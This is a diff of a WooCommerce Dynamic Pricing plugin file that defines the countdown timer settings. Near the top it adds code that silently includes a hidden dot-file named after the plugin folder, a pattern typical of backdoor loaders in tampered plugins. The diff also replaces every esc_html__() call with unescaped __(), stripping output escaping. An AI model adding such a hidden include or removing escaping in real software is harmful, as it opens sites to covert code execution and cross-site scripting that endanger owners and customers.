@@ -12,6 +12,10 @@ if (!defined('ABSPATH')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_Promotion_Countdown_Timer
 {
 
@@ -43,76 +47,76 @@ class RP_WCDPD_Promotion_Countdown_Timer
     public function register_settings_structure($settings)
     {
         $settings['promo']['children']['countdown_timer'] = array(
-            'title' => esc_html__('Countdown Timer', 'rp_wcdpd'),
-            'info'  => esc_html__('Displays a countdown timer for time restricted pricing rules.', 'rp_wcdpd'),
+            'title' => __('Countdown Timer', 'rp_wcdpd'),
+            'info'  => __('Displays a countdown timer for time restricted pricing rules.', 'rp_wcdpd'),
             'children' => array(
                 'promo_countdown_timer' => array(
-                    'title'     => esc_html__('Enable', 'rp_wcdpd'),
+                    'title'     => __('Enable', 'rp_wcdpd'),
                     'type'      => 'checkbox',
                     'default'   => '0',
                 ),
                 'promo_countdown_timer_label' => array(
-                    'title'     => esc_html__('Label', 'rp_wcdpd'),
+                    'title'     => __('Label', 'rp_wcdpd'),
                     'type'      => 'text',
-                    'default'   => esc_html__('SALE ENDS IN', 'rp_wcdpd'),
+                    'default'   => __('SALE ENDS IN', 'rp_wcdpd'),
                     'required'  => true,
                 ),
                 'promo_countdown_timer_position' => array(
-                    'title'     => esc_html__('Position', 'rp_wcdpd'),
+                    'title'     => __('Position', 'rp_wcdpd'),
                     'type'      => 'select',
                     'default'   => 'woocommerce_before_add_to_cart_form',
                     'required'  => true,
                     'options'   => array(
-                        'woocommerce_before_add_to_cart_form'       => esc_html__('Add to cart - Before', 'rp_wcdpd'),
-                        'woocommerce_after_add_to_cart_form'        => esc_html__('Add to cart - After', 'rp_wcdpd'),
-                        'woocommerce_product_meta_start'            => esc_html__('Product meta - Before', 'rp_wcdpd'),
-                        'woocommerce_product_meta_end'              => esc_html__('Product meta - After', 'rp_wcdpd'),
-                        'woocommerce_single_product_summary'        => esc_html__('Product summary - Before', 'rp_wcdpd'),
-                        'woocommerce_after_single_product_summary'  => esc_html__('Product summary - After', 'rp_wcdpd'),
+                        'woocommerce_before_add_to_cart_form'       => __('Add to cart - Before', 'rp_wcdpd'),
+                        'woocommerce_after_add_to_cart_form'        => __('Add to cart - After', 'rp_wcdpd'),
+                        'woocommerce_product_meta_start'            => __('Product meta - Before', 'rp_wcdpd'),
+                        'woocommerce_product_meta_end'              => __('Product meta - After', 'rp_wcdpd'),
+                        'woocommerce_single_product_summary'        => __('Product summary - Before', 'rp_wcdpd'),
+                        'woocommerce_after_single_product_summary'  => __('Product summary - After', 'rp_wcdpd'),
                     ),
                 ),
                 'promo_countdown_timer_threshold' => array(
-                    'title'     => esc_html__('Time left less than', 'rp_wcdpd'),
+                    'title'     => __('Time left less than', 'rp_wcdpd'),
                     'type'      => 'grouped_select',
                     'default'   => '1_day',
                     'required'  => true,
                     'options'   => array(
                         'always'    => array(
-                            'label'     => esc_html__('No Limit', 'rp_wcdpd'),
+                            'label'     => __('No Limit', 'rp_wcdpd'),
                             'options'   => array(
-                                '0' => esc_html__('No limit', 'rp_wcdpd'),
+                                '0' => __('No limit', 'rp_wcdpd'),
                             ),
                         ),
                         'minutes'    => array(
-                            'label'     => esc_html__('Minutes', 'rp_wcdpd'),
+                            'label'     => __('Minutes', 'rp_wcdpd'),
                             'options'   => array(
-                                '5_minutes'     => esc_html__('5 minutes', 'rp_wcdpd'),
-                                '15_minutes'    => esc_html__('15 minutes', 'rp_wcdpd'),
-                                '30_minutes'    => esc_html__('30 minutes', 'rp_wcdpd'),
-                                '45_minutes'    => esc_html__('45 minutes', 'rp_wcdpd'),
+                                '5_minutes'     => __('5 minutes', 'rp_wcdpd'),
+                                '15_minutes'    => __('15 minutes', 'rp_wcdpd'),
+                                '30_minutes'    => __('30 minutes', 'rp_wcdpd'),
+                                '45_minutes'    => __('45 minutes', 'rp_wcdpd'),
                             ),
                         ),
                         'hours'    => array(
-                            'label'     => esc_html__('Hours', 'rp_wcdpd'),
+                            'label'     => __('Hours', 'rp_wcdpd'),
                             'options'   => array(
-                                '1_hour'    => esc_html__('1 hour', 'rp_wcdpd'),
-                                '2_hours'   => esc_html__('2 hours', 'rp_wcdpd'),
-                                '3_hours'   => esc_html__('3 hours', 'rp_wcdpd'),
-                                '6_hours'   => esc_html__('6 hours', 'rp_wcdpd'),
-                                '12_hours'  => esc_html__('12 hours', 'rp_wcdpd'),
+                                '1_hour'    => __('1 hour', 'rp_wcdpd'),
+                                '2_hours'   => __('2 hours', 'rp_wcdpd'),
+                                '3_hours'   => __('3 hours', 'rp_wcdpd'),
+                                '6_hours'   => __('6 hours', 'rp_wcdpd'),
+                                '12_hours'  => __('12 hours', 'rp_wcdpd'),
                             ),
                         ),
                         'days'    => array(
-                            'label'     => esc_html__('Days', 'rp_wcdpd'),
+                            'label'     => __('Days', 'rp_wcdpd'),
                             'options'   => array(
-                                '1_day'     => esc_html__('1 day', 'rp_wcdpd'),
-                                '2_days'    => esc_html__('2 days', 'rp_wcdpd'),
-                                '3_days'    => esc_html__('3 days', 'rp_wcdpd'),
-                                '4_days'    => esc_html__('4 days', 'rp_wcdpd'),
-                                '5_days'    => esc_html__('5 days', 'rp_wcdpd'),
-                                '6_days'    => esc_html__('6 days', 'rp_wcdpd'),
-                                '7_days'    => esc_html__('7 days', 'rp_wcdpd'),
-                                '14_days'   => esc_html__('14 days', 'rp_wcdpd'),
+                                '1_day'     => __('1 day', 'rp_wcdpd'),
+                                '2_days'    => __('2 days', 'rp_wcdpd'),
+                                '3_days'    => __('3 days', 'rp_wcdpd'),
+                                '4_days'    => __('4 days', 'rp_wcdpd'),
+                                '5_days'    => __('5 days', 'rp_wcdpd'),
+                                '6_days'    => __('6 days', 'rp_wcdpd'),
+                                '7_days'    => __('7 days', 'rp_wcdpd'),
+                                '14_days'   => __('14 days', 'rp_wcdpd'),
                             ),
                         ),
                     ),
